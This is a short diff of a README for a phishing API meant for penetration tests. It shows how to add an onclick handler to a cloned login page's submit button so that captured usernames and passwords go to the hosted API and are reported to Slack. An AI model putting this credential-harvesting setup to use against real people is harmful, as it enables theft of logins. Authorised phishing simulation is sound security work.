@@ -89,7 +89,7 @@ Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to 
 
 2) Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments
 
-	`<buttom value="Submit!" onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">`
+	`<button onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">Submit!</button>`
 	
 	PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)<br />
 	NAME/ID_OF_LOGIN_FORM = Whatever the cloned `<form name="">` is set to for the page you cloned<br />
